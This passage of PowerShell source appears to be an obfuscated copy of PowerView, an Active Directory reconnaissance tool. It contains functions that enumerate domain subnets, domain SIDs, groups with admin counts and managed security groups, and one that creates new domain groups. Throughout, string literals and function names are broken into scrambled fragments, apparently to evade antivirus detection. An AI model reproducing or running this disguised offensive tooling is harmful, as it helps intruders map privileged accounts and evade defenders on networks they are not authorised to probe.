        if ($PSBoundParameters[("{2}{0}{4}{3}{1}"-f'sult','Size','Re','e','Pag'  )]  ) { $SearcherArguments[( "{3}{2}{0}{1}{4}"-f'ge','Si','a','ResultP','ze')] =  $ResultPageSize }
        if ( $PSBoundParameters[(  "{2}{3}{1}{0}"-f 'mit','i','Ser','verTimeL')]  ) { $SearcherArguments[( "{2}{0}{1}{3}"-f 'meL','im','ServerTi','it' )] = $ServerTimeLimit }
        if (  $PSBoundParameters[("{0}{2}{1}"-f'Secu','ks','rityMas'  )]) { $SearcherArguments[("{3}{1}{2}{0}{4}"-f 'ask','urit','yM','Sec','s')]   = $SecurityMasks }
        if (  $PSBoundParameters[(  "{0}{1}{2}" -f 'T','ombst','one'  )]  ) { $SearcherArguments[("{3}{1}{2}{0}"-f 'one','o','mbst','T' )] = $Tombstone }
        if ($PSBoundParameters[( "{2}{1}{0}"-f'ntial','e','Cred')]) { $SearcherArguments[( "{2}{1}{0}" -f'ntial','ede','Cr')] = $Credential }
        $SubnetSearcher  = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (  $SubnetSearcher ) {
            $IdentityFilter  =   ''
            $Filter  = ''
            $Identity |  Where-Object {$_} |   ForEach-Object {
                $IdentityInstance  =  $_.rePlACe('(', '\28'  ).REpLAce( ')', '\29'  )
                if (  $IdentityInstance -match (  "{1}{0}" -f '*','^CN=.' )  ) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if (  (-not $PSBoundParameters[(  "{1}{0}"-f 'in','Doma')]  ) -and ( -not $PSBoundParameters[( "{2}{0}{3}{1}"-f'r','Base','Sea','ch'  )] ) ) {
                        
                        
                        $IdentityDomain =   $IdentityInstance.SUBSTrInG( $IdentityInstance.indexof('DC=' )) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('['  + 'Get' + '-' + 'Dom'+'ainSub'  + 'ne'  + 't] '+ 'Extract' +  'e' + 'd '  +'d'  +'o' + 'main ' +  "'$IdentityDomain' " +'from' + ' ' +"'$IdentityInstance'"  )
                        $SearcherArguments[( "{1}{0}"-f 'main','Do')]   = $IdentityDomain
                        $SubnetSearcher  = Get-DomainSearcher @SearcherArguments
                        if (  -not $SubnetSearcher  ) {
                            Write-Warning ('[G'  + 'et-Dom'+ 'ainSub'  +'n' +  'et] ' + 'Unabl'  +  'e ' +'t'+ 'o ' +  'r' +  'etri'+  'eve '  +'domain' + ' ' +  'search' + 'er' +' '+ 'fo'+'r '+  "'$IdentityDomain'" )
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString  =   (-Join (  ([Guid]$IdentityInstance).tOByteaRRAY(    ) |   ForEach-Object {$_.ToStRiNG('X').PadLEfT(  2,'0'  )}  ) ) -Replace (  (  "{1}{0}"-f '..)','(' )  ),'\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ( $IdentityFilter -and ( $IdentityFilter.TRim() -ne '' ) ) {
                $Filter += "(|$IdentityFilter)"
            }

            if (  $PSBoundParameters[( "{0}{2}{1}" -f 'LD','Filter','AP')]  ) {
                Write-Verbose ('[Get'+  '-Dom'  +'a'  + 'inSub'  + 'net'  +'] '  +  'Usi'+'ng ' +'a' +'dditional'  +' '  + 'LD' +  'AP '  + 'filte'+ 'r' + ': '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $SubnetSearcher.fIltER   =  "(&(objectCategory=subnet)$Filter)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if ( $PSBoundParameters[("{0}{1}" -f'FindOn','e' )]) { $Results   = $SubnetSearcher.fiNDone() }
            else { $Results =  $SubnetSearcher.fInDALL(   ) }
            $Results   |   Where-Object {$_} |   ForEach-Object {
                if (  $PSBoundParameters['Raw'] ) {
                    
                    $Subnet =   $_
                }
                else {
                    $Subnet   =  Convert-LDAPProperty -Properties $_.PRoPERTIES
                }
                $Subnet.PSOBJeCT.typeNaMeS.InserT(0, (  "{2}{1}{3}{0}"-f'net','u','PowerView.S','b' )  )

                if ( $PSBoundParameters[( "{0}{2}{1}" -f 'S','Name','ite')]) {
                    
                    
                    if (  $Subnet.PropErtieS -and ($Subnet.pRoPErtiEs.SItEOBjEcT -like "*$SiteName*"  ) ) {
                        $Subnet
                    }
                    elseif ( $Subnet.SiTeOBjEct -like "*$SiteName*"  ) {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results ) {
                try { $Results.disPOSe(   ) }
                catch {
                    Write-Verbose ( '[Get-Domai'+'n' + 'Su' +'b'+  'net] ' + 'Err'+  'or ' +  'disposi' +'n' + 'g '+ 'of'  +' '  + 'the'+' '  +'R'+ 'e'+'sults '+  'obje'+ 'ct: '+"$_")
                }
            }
            $SubnetSearcher.disPoSe( )
        }
    }
}


function GE`T`-DO`m`AINsID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{2}{3}{1}{0}" -f 'ocess','r','PSShou','ldP'}, ''  )]
    [OutputType([String] )]
    [CmdletBinding( )]
    Param(  
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{4}{3}{1}{0}{2}"-f 'roll','nCont','er','ai','Dom'} )]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential   = [Management.Automation.PSCredential]::eMpTy
     )

    $SearcherArguments  =  @{
        (  "{0}{2}{1}"-f'LDAPF','lter','i' ) =   (  ("{10}{3}{0}{1}{5}{8}{4}{11}{6}{2}{9}{7}" -f 'erAccount','C','.113556.1','s','o','o','40','92)','ntr','.4.803:=81','(u','l:1.2.8'  ) )
    }
    if ( $PSBoundParameters[("{1}{0}"-f'in','Doma'  )]) { $SearcherArguments[( "{0}{1}"-f'Doma','in')]  =  $Domain }
    if ( $PSBoundParameters[( "{1}{0}" -f'rver','Se')]  ) { $SearcherArguments[(  "{1}{0}" -f'er','Serv' )]   =  $Server }
    if ( $PSBoundParameters[( "{1}{2}{0}" -f'ial','C','redent')] ) { $SearcherArguments[( "{0}{1}{2}"-f 'C','red','ential'  )]   = $Credential }

    $DCSID  =  Get-DomainComputer @SearcherArguments -FindOne  | Select-Object -First 1 -ExpandProperty (  'o'  +  'bjects'  + 'id'  )

    if ( $DCSID ) {
        $DCSID.SubstrInG( 0, $DCSID.lAstinDExOF( '-'  ))
    }
    else {
        Write-Verbose (  '[Get'  +'-Domai' +'nSID]'  + ' '  + 'Erro' +'r '  +  'extra'+'cti' + 'n'+'g '  +  'doma'  +'in'+' ' + 'SI' + 'D '  +'fo' +  'r ' + "'$Domain'"  )
    }
}


function GE`T-DOm`AIngrO`Up {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{0}{3}{1}{2}" -f'PSS','P','rocess','hould'}, ''  )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{3}{4}{2}{10}{8}{7}{0}{9}{6}{1}"-f'M','ments','eclaredV','SUse','D','P','nAssign','s','r','oreTha','a'}, '')]
    [OutputType( {"{2}{0}{1}{3}"-f'werView.Gr','o','Po','up'})]
    [CmdletBinding( dEFAuLtParAmeTErsETNAMe = {"{1}{0}{3}{2}"-f'llo','A','egation','wDel'}  )]
    Param(  
        [Parameter(  positiOn =   0, VAlUeFRoMPipElINe  =  $True, VALUefRoMpipEliNeBYpRopertYnamE   = $True)]
        [Alias(  {"{3}{1}{0}{2}"-f 'edNam','guish','e','Distin'}, {"{1}{3}{0}{4}{2}"-f'c','Sa','Name','mA','count'}, {"{0}{1}"-f 'Na','me'}, {"{3}{1}{5}{0}{2}{4}"-f 'u','n','ish','MemberDisti','edName','g'}, {"{2}{3}{0}{1}" -f 'am','e','Me','mberN'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{1}{0}" -f 'e','UserNam'})]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet( {"{3}{0}{2}{1}" -f 'omain','ocal','L','D'}, {"{2}{1}{3}{4}{0}" -f 'l','o','NotD','main','Loca'}, {"{1}{0}" -f'bal','Glo'}, {"{0}{2}{1}" -f 'N','tGlobal','o'}, {"{0}{1}" -f 'Un','iversal'}, {"{0}{2}{1}"-f 'NotUn','rsal','ive'}  )]
        [Alias({"{0}{1}"-f 'Scop','e'} )]
        [String]
        $GroupScope,

        [ValidateSet(  {"{2}{0}{1}" -f 'ecur','ity','S'}, {"{2}{3}{1}{0}" -f'on','buti','Di','stri'}, {"{4}{0}{3}{2}{1}" -f'at','ystem','dByS','e','Cre'}, {"{3}{0}{1}{4}{2}"-f 'te','dB','tem','NotCrea','ySys'})]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{1}{0}"-f 'lter','Fi'} )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{2}{0}{1}" -f'DSPa','th','A'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{2}{4}{3}{1}{0}" -f 'roller','nt','Dom','o','ainC'}  )]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{2}{1}{0}"-f 'el','ev','OneL'}, {"{0}{1}" -f'Subt','ree'} )]
        [String]
        $SearchScope   =  (  "{2}{1}{0}" -f 'tree','ub','S'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize =  200,

        [ValidateRange( 1, 10000  )]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(  {"{0}{1}" -f'Da','cl'}, {"{0}{1}" -f 'Grou','p'}, {"{0}{1}"-f 'Non','e'}, {"{0}{1}" -f 'Ow','ner'}, {"{0}{1}" -f 'Sa','cl'}  )]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias({"{0}{1}{2}" -f 'Retu','rnO','ne'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential  =   [Management.Automation.PSCredential]::eMptY,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments  =   @{}
        if ($PSBoundParameters[( "{0}{1}" -f 'Doma','in' )] ) { $SearcherArguments[( "{1}{0}" -f'ain','Dom' )]   =  $Domain }
        if ($PSBoundParameters[( "{0}{1}{2}" -f'Pr','opert','ies' )] ) { $SearcherArguments[(  "{2}{3}{0}{1}"-f 'r','ties','P','rope' )]  = $Properties }
        if ( $PSBoundParameters[(  "{2}{0}{1}" -f'r','chBase','Sea')]) { $SearcherArguments[( "{1}{3}{0}{2}"-f 's','Sea','e','rchBa'  )]  =   $SearchBase }
        if (  $PSBoundParameters[( "{0}{1}" -f 'Se','rver' )]  ) { $SearcherArguments[("{0}{1}"-f 'Se','rver'  )]   =   $Server }
        if ( $PSBoundParameters[( "{0}{1}{2}" -f 'Sear','ch','Scope' )]) { $SearcherArguments[("{0}{2}{1}{3}"-f'Sear','Scop','ch','e')] =  $SearchScope }
        if (  $PSBoundParameters[( "{2}{3}{1}{0}{4}"-f'PageS','t','Res','ul','ize'  )] ) { $SearcherArguments[( "{2}{4}{1}{0}{3}"-f 'e','ag','Result','Size','P' )]  = $ResultPageSize }
        if (  $PSBoundParameters[(  "{0}{1}{3}{2}{4}"-f 'ServerTim','eLi','i','m','t'  )] ) { $SearcherArguments[("{0}{2}{1}{3}" -f 'S','e','erv','rTimeLimit'  )] =   $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{1}{0}" -f'asks','ityM','Secur'  )]) { $SearcherArguments[("{2}{3}{0}{1}"-f'Mask','s','Securit','y' )] =  $SecurityMasks }
        if (  $PSBoundParameters[( "{1}{2}{0}"-f 'e','Tombst','on')]) { $SearcherArguments[( "{1}{2}{0}"-f'one','To','mbst'  )]  =   $Tombstone }
        if ( $PSBoundParameters[( "{0}{3}{1}{2}" -f 'C','edentia','l','r')]) { $SearcherArguments[(  "{0}{2}{1}{3}" -f'Cr','nt','ede','ial')]  =  $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ( $GroupSearcher ) {
            if ($PSBoundParameters[("{2}{3}{1}{0}"-f 'tity','den','Memb','erI')]) {

                if ( $SearcherArguments[("{0}{1}{2}" -f'P','rope','rties'  )]) {
                    $OldProperties   = $SearcherArguments[( "{0}{2}{1}{3}"-f'Propert','e','i','s')]
                }

                $SearcherArguments[( "{1}{2}{0}"-f 'ty','Ide','nti' )]  = $MemberIdentity
                $SearcherArguments['Raw']  =  $True

                Get-DomainObject @SearcherArguments  | ForEach-Object {
                    
                    $ObjectDirectoryEntry =  $_.geTDiRecTOrYENtry(    )

                    
                    $ObjectDirectoryEntry.REFrESHCache((  "{1}{0}{2}" -f 'en','tok','Groups')  )

                    $ObjectDirectoryEntry.tOkEngROUps   |   ForEach-Object {
                        
                        $GroupSid  =  ( New-Object ( 'Syste'+'m.Security.'+'Prin'+ 'cip' +'al'+'.'+  'S'  +'e'+'c'+'urityI'+  'dentifie'  + 'r')($_,0 )).vaLue

                        
                        if ( $GroupSid -notmatch ("{0}{2}{1}{3}"-f'^S','5-32','-1-','-.*' ) ) {
                            $SearcherArguments[(  "{1}{0}{2}"-f'dentit','I','y'  )]   = $GroupSid
                            $SearcherArguments['Raw']  = $False
                            if ( $OldProperties) { $SearcherArguments[("{0}{2}{1}"-f 'Pro','rties','pe')]   =  $OldProperties }
                            $Group   =   Get-DomainObject @SearcherArguments
                            if ( $Group ) {
                                $Group.PSobjeCT.TYpENAmes.iNseRt( 0, ( "{0}{2}{1}{3}" -f'PowerVi','Grou','ew.','p' ))
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter  = ''
                $Filter =  ''
                $Identity |   Where-Object {$_} |  ForEach-Object {
                    $IdentityInstance  =   $_.RePLACe('(', '\28' ).RepLacE(')', '\29'  )
                    if (  $IdentityInstance -match ( "{1}{0}" -f'-1-','^S'  ) ) {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ( $IdentityInstance -match ( "{0}{1}" -f'^CN','=' )) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((  -not $PSBoundParameters[("{1}{0}" -f 'ain','Dom'  )] ) -and (-not $PSBoundParameters[("{0}{1}{2}" -f'Se','arch','Base'  )]  )  ) {
                            
                            
                            $IdentityDomain  = $IdentityInstance.sUBstRINg( $IdentityInstance.inDeXOF(  'DC=' ) ) -replace 'DC=','' -replace ',','.'
                            Write-Verbose ( '[Get-D'+'omainG' +  'roup]' + ' '+  'Ext' +'r'+  'acted '  + 'domain' +' '  + "'$IdentityDomain' "+'f'+'rom ' + "'$IdentityInstance'" )
                            $SearcherArguments[( "{2}{1}{0}" -f'main','o','D' )]   = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if ( -not $GroupSearcher  ) {
                                Write-Warning (  '[G'+ 'et-DomainGr' +'ou' +  'p] '+ 'Un'+ 'a'+ 'ble ' +'t'+ 'o '  +  'retr' +'iev'  +  'e ' +'d'  +  'oma' +  'in '+'s' +  'e' + 'arc' +'her '+ 'f'  +'or '  + "'$IdentityDomain'"  )
                            }
                        }
                    }
                    elseif (  $IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$' ) {
                        $GuidByteString = ( ( [Guid]$IdentityInstance  ).TobYTeARrAy(   )   |  ForEach-Object { '\' + $_.TOStrING(  'X2' ) }  ) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif (  $IdentityInstance.ContAinS('\')  ) {
                        $ConvertedIdentityInstance =  $IdentityInstance.rePlAce( '\28', '('  ).RePlACe(  '\29', ')')   |  Convert-ADName -OutputType ('Ca' +  'n'  +'onical'  )
                        if (  $ConvertedIdentityInstance ) {
                            $GroupDomain =   $ConvertedIdentityInstance.suBString(  0, $ConvertedIdentityInstance.INdeXof(  '/') )
                            $GroupName   =  $IdentityInstance.SpliT( '\' )[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments[( "{0}{1}" -f 'Dom','ain'  )]  = $GroupDomain
                            Write-Verbose (  '[' + 'G' +  'et-Do'  + 'mainGroup] '+ 'E'  + 'xtra'  +  'cted '  +'domain'+  ' ' +  "'$GroupDomain' "  +'from'  +' '  +  "'$IdentityInstance'" )
                            $GroupSearcher  = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if ($IdentityFilter -and ( $IdentityFilter.tRim(    ) -ne ''  )  ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ( $PSBoundParameters[(  "{0}{2}{1}" -f 'AdminCou','t','n'  )] ) {
                    Write-Verbose ( "{12}{11}{7}{2}{4}{8}{9}{3}{6}{5}{0}{10}{1}" -f'ount','1','rching','m',' f','C','in','nGroup] Sea','o','r ad','=','Get-Domai','[')
                    $Filter += ( "{0}{3}{2}{1}" -f'(a',')','mincount=1','d')
                }
                if ( $PSBoundParameters[(  "{1}{0}{2}"-f'Sc','Group','ope')]) {
                    $GroupScopeValue   =   $PSBoundParameters[("{2}{1}{3}{0}" -f'cope','p','Grou','S' )]
                    $Filter   =   Switch ( $GroupScopeValue ) {
                        ("{2}{1}{0}"-f 'l','inLoca','Doma' )       { ("{4}{8}{2}{5}{1}{10}{9}{3}{0}{6}{7}"-f '6.1.4.8','e:1.2.','pT','5','(gro','yp','03:=','4)','u','1135','840.'  ) }
                        (  "{1}{2}{3}{0}" -f 'cal','NotDoma','in','Lo'  )    { (  "{1}{0}{5}{8}{4}{9}{3}{6}{7}{2}" -f 'groupType:1.2.84','(!(',')','80','4','0.1135','3:=','4)','56.1.','.' ) }
                        ("{1}{0}" -f 'obal','Gl' )            { ( "{1}{3}{0}{4}{7}{6}{5}{2}" -f'2','(grou','803:=2)','pType:1.','.','56.1.4.','35','840.11' ) }
                        (  "{0}{3}{2}{1}"-f 'N','obal','Gl','ot')         { (  (  "{2}{5}{6}{1}{4}{8}{7}{0}{3}" -f ':=2','.2.8','(','))','40.','!','(groupType:1','.4.803','113556.1') ) }
                        (  "{0}{2}{1}"-f 'Univers','l','a')         { ( "{2}{7}{3}{8}{5}{0}{6}{1}{4}" -f '2.840.11355','.1.4.803:=','(grou','Typ','8)',':1.','6','p','e' ) }
                        ("{0}{1}{3}{2}" -f'N','otUnive','sal','r')      { ("{3}{7}{1}{11}{6}{10}{4}{2}{8}{0}{5}{9}"-f'=','upType:1','.4.80','(!(','3556.1','8','2.840','gro','3:','))','.11','.' ) }
                    }
                    Write-Verbose ('[Get'  + '-DomainG'+  'rou' +  'p'  +'] '  +'Sear'+  'chin'+  'g '  +'fo'+  'r ' +  'grou'  + 'p'  +  ' '  + 'sco' + 'pe '  +  "'$GroupScopeValue'" )
                }
                if ( $PSBoundParameters[( "{2}{1}{3}{0}" -f 'ty','pP','Grou','roper')] ) {
                    $GroupPropertyValue   =   $PSBoundParameters[(  "{3}{2}{0}{1}"-f 'ropert','y','oupP','Gr')]
                    $Filter = Switch (  $GroupPropertyValue ) {
                        ( "{2}{1}{0}" -f 'curity','e','S')              { ( "{1}{9}{7}{6}{2}{4}{3}{5}{11}{0}{10}{12}{8}"-f'556.1.4.803:=2','(','.8','0','4','.11','.2','Type:1','8)','group','147','3','48364' ) }
                        (  "{0}{1}{3}{2}" -f 'D','istr','bution','i' )          { ( "{0}{4}{6}{3}{2}{5}{1}{7}"-f '(!(gr','83648)','.1.4.803:=','113556','ou','21474','pType:1.2.840.',')' ) }
                        (  "{1}{2}{0}{3}" -f 'BySys','Create','d','tem'  )       { (  (  "{7}{8}{3}{1}{9}{5}{6}{0}{10}{4}{2}" -f'.113',':','3:=1)','upType','56.1.4.80','4','0','(','gro','1.2.8','5'  )) }
                        ("{1}{2}{3}{0}"-f'BySystem','Not','Cre','ated'  )    { ( "{0}{6}{5}{4}{2}{3}{1}"-f '(!(gro',')','=1',')','556.1.4.803:','pe:1.2.840.113','upTy') }
                    }
                    Write-Verbose (  '[Get' +  '-'  + 'Do'+  'main'  +  'G'+'roup] ' +  'Se' +'archin' +  'g '  +  'f' +'or ' + 'gr' +  'oup '  +'propert'  +'y ' +"'$GroupPropertyValue'")
                }
                if (  $PSBoundParameters[("{0}{1}{2}"-f 'L','DAPF','ilter')]  ) {
                    Write-Verbose (  '[Get-'  +'D' +'om'  +'ainGro' +  'up] '+  'Usin'  +  'g '  + 'ad' + 'ditiona'+ 'l '+'LD'  + 'AP '  + 'filte' +  'r: '+  "$LDAPFilter" )
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filTER  =   "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter) "

                if ( $PSBoundParameters[("{0}{1}" -f 'Fin','dOne' )]  ) { $Results = $GroupSearcher.FiNDOne() }
                else { $Results  =  $GroupSearcher.fIndALL(  ) }
                $Results   |   Where-Object {$_} |  ForEach-Object {
                    if ( $PSBoundParameters['Raw'] ) {
                        
                        $Group  =  $_
                    }
                    else {
                        $Group  =   Convert-LDAPProperty -Properties $_.prOPErtiEs
                    }
                    $Group.PSObJect.TYpenAMES.inseRT( 0, (  "{3}{2}{1}{0}" -f'Group','.','ew','PowerVi') )
                    $Group
                }
                if ( $Results ) {
                    try { $Results.dIsPosE(  ) }
                    catch {
                        Write-Verbose ("{3}{1}{4}{6}{2}{7}{15}{11}{14}{13}{0}{10}{12}{8}{5}{9}" -f'in','G','ma','[','et-D','ts obje','o','inGro','l','ct','g of ','p','the Resu','dispos','] Error ','u'  )
                    }
                }
                $GroupSearcher.DispoSe()
            }
        }
    }
}


function New-Do`maI`N`GR`Oup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{8}{7}{9}{3}{2}{6}{1}{4}{5}{0}{11}{10}"-f'n','g','rStateChan','o','F','u','gin','UseShouldProces','PS','sF','ons','cti'}, '' )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{3}{1}{4}{2}{0}" -f's','ho','ces','PSS','uldPro'}, ''  )]
    [OutputType(  {"{5}{7}{3}{8}{4}{2}{0}{1}{6}"-f 'nt.Grou','pPrinc','tManageme','yServ','un','Direc','ipal','tor','ices.Acco'})]
    Param( 
        [Parameter(maNdAtORY  =   $True  )]
        [ValidateLength( 0, 256  )]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Name,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Description,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential   =   [Management.Automation.PSCredential]::eMPtY
     )

    $ContextArguments   =   @{
        ("{2}{1}{0}"-f'ity','ent','Id' )   =   $SamAccountName
    }
    if ($PSBoundParameters[("{1}{2}{0}"-f'in','D','oma'  )]) { $ContextArguments[("{1}{0}"-f 'n','Domai')] =   $Domain }
    if (  $PSBoundParameters[("{1}{0}{2}"-f 'e','Cred','ntial'  )]) { $ContextArguments[( "{1}{2}{0}"-f'al','C','redenti')]   =  $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if (  $Context ) {
        $Group   =  New-Object -TypeName (  'Sy' +'stem.DirectoryServic'+  'es.A' + 'c'+ 'co'+ 'untMan' +  'age'+ 'me' + 'nt.GroupPrincip'  + 'al'  ) -ArgumentList ( $Context.cONTexT)

        
        $Group.sAMACCouNtnAMe =   $Context.idenTity

        if (  $PSBoundParameters[( "{0}{1}" -f'N','ame'  )]  ) {
            $Group.name  =   $Name
        }
        else {
            $Group.naMe  =   $Context.IDeNTItY
        }
        if (  $PSBoundParameters[( "{3}{2}{0}{1}"-f'a','me','isplayN','D')]  ) {
            $Group.diSplaYNaME  = $DisplayName
        }
        else {
            $Group.DisPlAYnAmE  = $Context.IdeNTItY
        }

        if ($PSBoundParameters[( "{1}{2}{0}{3}"-f'cri','D','es','ption' )] ) {
            $Group.DESCRIPtioN = $Description
        }

        Write-Verbose ( '[N'+  'ew-Dom'  +  'a'+ 'inGr'  +'oup' + '] '  + 'Attem'+ 'pting' +  ' ' +'to'  +  ' ' +  'crea'  +'t'  +  'e '+  'g'+ 'roup ' +"'$SamAccountName'"  )
        try {
            $Null =  $Group.SAVE(  )
            Write-Verbose ( '[N'+'ew-DomainG' +'r'  + 'ou'+'p]'+  ' '+ 'Grou'+ 'p' + ' '+ "'$SamAccountName' " + 'succ' +'e'+  's'+ 'sfully'+ ' '  +'c'+ 'reated'  )
            $Group
        }
        catch {
            Write-Warning ( '['+'Ne'  +  'w'  + '-Doma'+  'inGroup] '  +  'Er' + 'ror '  + 'cr'+'eat'+  'ing '  +  'gr' +'o'+ 'up '+ "'$SamAccountName' " + ': '  +  "$_" )
        }
    }
}


function gET`-DO`M`AInmaNaG`EdSe`CurIT`ygrOUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}" -f 'PSSho','s','uldProces'}, '')]
    [OutputType({"{5}{8}{3}{1}{7}{0}{6}{4}{2}" -f'edSe','ie','roup','V','ityG','P','cur','w.Manag','ower'} )]
    [CmdletBinding(   )]
    Param(
        [Parameter(  PosItion = 0, VaLUefrOmPIPElinE = $True, ValuEfRoMPipELinebypropeRTYnaMe  =  $True )]
        [Alias({"{1}{0}" -f'ame','N'} )]
        [ValidateNotNullOrEmpty( )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'ADSP','at','h'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty( )]
        [Alias({"{2}{1}{3}{4}{0}{5}" -f'Controlle','oma','D','i','n','r'})]
        [String]
        $Server,

        [ValidateSet(  {"{1}{0}"-f'ase','B'}, {"{0}{1}{2}"-f 'O','neLe','vel'}, {"{1}{0}"-f 'ee','Subtr'}  )]
        [String]
        $SearchScope   =   ("{2}{0}{1}"-f'bt','ree','Su'),

        [ValidateRange(  1, 10000  )]
        [Int]
        $ResultPageSize =  200,

        [ValidateRange(  1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential =   [Management.Automation.PSCredential]::EmptY
    )

    BEGIN {
        $SearcherArguments   =  @{
            (  "{1}{2}{0}" -f 'PFilter','L','DA' ) =   ( ( ( "{10}{14}{2}{8}{12}{5}{16}{15}{1}{7}{11}{6}{9}{13}{4}{3}{0}"-f '3648))','1','y','14748','803:=2','upT','0.113556.','.2.8','=*)(g','1','(&(m','4','ro','.4.','anagedB','pe:','y' )  ))
            (  "{2}{1}{0}"-f'ties','per','Pro'  )  =  (  "{4}{1}{5}{10}{2}{0}{9}{8}{7}{6}{3}"-f'amacc','e,managedBy,','type,s','me','distinguishedNam','samaccou','na','t','n','ou','nt'  )
        }
        if ( $PSBoundParameters[("{0}{2}{1}"-f 'Sea','hBase','rc' )]  ) { $SearcherArguments[("{1}{2}{0}"-f 'se','S','earchBa')] =   $SearchBase }
        if (  $PSBoundParameters[( "{0}{1}" -f'Se','rver'  )]  ) { $SearcherArguments[(  "{2}{1}{0}" -f'ver','er','S' )] =  $Server }
        if (  $PSBoundParameters[(  "{1}{2}{0}" -f 'chScope','S','ear'  )]  ) { $SearcherArguments[("{3}{2}{0}{1}"-f 'hScop','e','earc','S' )]  =  $SearchScope }
        if (  $PSBoundParameters[("{0}{1}{2}"-f 'ResultPa','geS','ize')]  ) { $SearcherArguments[("{3}{0}{1}{4}{2}" -f 'sult','Pag','ize','Re','eS' )]   = $ResultPageSize }
        if ($PSBoundParameters[( "{3}{0}{4}{1}{2}" -f 'rT','me','Limit','Serve','i' )] ) { $SearcherArguments[( "{1}{0}{3}{2}{4}" -f 'rve','Se','meLimi','rTi','t'  )]  = $ServerTimeLimit }
        if ( $PSBoundParameters[(  "{1}{3}{4}{0}{2}" -f 'u','S','rityMasks','e','c' )] ) { $SearcherArguments[(  "{2}{1}{0}{3}" -f 'yMas','ecurit','S','ks' )] =  $SecurityMasks }
        if (  $PSBoundParameters[("{1}{2}{0}" -f 'one','Tom','bst' )]  ) { $SearcherArguments[("{2}{0}{1}"-f'ombs','tone','T'  )]  =   $Tombstone }
        if ($PSBoundParameters[(  "{2}{0}{1}" -f'en','tial','Cred' )]  ) { $SearcherArguments[( "{0}{2}{1}"-f'Cre','ential','d')] =  $Credential }
    }

    PROCESS {
        if ( $PSBoundParameters[("{2}{0}{1}"-f'omai','n','D'  )] ) {
            $SearcherArguments[(  "{1}{2}{0}" -f 'n','Doma','i' )]  = $Domain
            $TargetDomain   =  $Domain
        }
        else {
            $TargetDomain  =  $Env:USERDNSDOMAIN
        }

        
        Get-DomainGroup @SearcherArguments   |   ForEach-Object {
            $SearcherArguments[(  "{2}{0}{1}"-f'tie','s','Proper')]   = (  "{3}{11}{4}{6}{16}{9}{12}{15}{5}{13}{8}{14}{2}{7}{0}{10}{1}" -f 'ntn','bjectsid','mac','dis','in','sa','gu','cou','ountt','shedname','ame,o','t',',nam','macc','ype,sa','e,','i'  )
            $SearcherArguments[(  "{0}{1}{2}" -f'I','den','tity'  )]  =  $_.mANaGEDbY
            $Null   =  $SearcherArguments.ReMoVE(( "{3}{1}{2}{0}" -f'er','il','t','LDAPF'  ) )

            
            
